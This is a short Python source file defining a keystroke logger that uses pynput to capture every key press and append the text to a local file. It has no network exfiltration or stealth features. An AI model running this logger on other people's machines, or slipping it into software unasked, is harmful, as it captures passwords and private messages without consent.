from pynput import keyboard
from pynput.keyboard import Controller, Key
import platform

class Logger(): 

    def __init__(self, output_file):
        self.output = open(output_file, 'a')
        self.cur_str = ""
        self.controller = Controller()

    def __del__(self):
        self.output.close()

    def on_press(self, key):
        try:
            self.cur_str += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.cur_str += " "
            elif key == keyboard.Key.enter:
                self.cur_str += "\n"
            elif key == keyboard.Key.backspace:
                self.cur_str += "<BACKSPACE>"
            else:
                self.cur_str += "<NON-CHAR>"
        if len(self.cur_str) > 50:
            self.output.write(self.cur_str)
            self.cur_str = ""


    def run(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
